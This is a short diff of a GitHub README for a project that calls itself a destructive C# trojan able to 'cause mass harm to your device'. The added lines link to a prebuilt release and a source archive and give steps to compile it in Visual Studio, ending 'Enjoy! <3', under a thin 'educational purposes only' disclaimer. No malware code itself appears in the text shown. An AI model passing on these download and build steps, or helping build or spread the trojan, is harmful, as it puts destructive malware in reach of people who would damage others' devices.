@@ -5,8 +5,15 @@ Destructive trojan written in C# Its VirusTotal scan can be found [here](https:/
 I made this as a test for my C# skills.
 This (destructive) trojan can cause mass harm to your device.
 
-## How To Compile
+## Usage
+
 ### Releases
+A stable release of the project can be found [here](https://github.com/Magnito14/Trojan/releases/tag/Trojan)
+
+### How To Compile
+- Download the source code [here](https://github.com/Magnito14/Trojan/archive/refs/tags/Trojan.zip), and open it in Visual Studio.
+- Press CTRL + B on your keyboard to build the application.
+- Enjoy! <3
 
 ## Disclaimer
 This source is for educational purposes only. Do not use this maliciously.
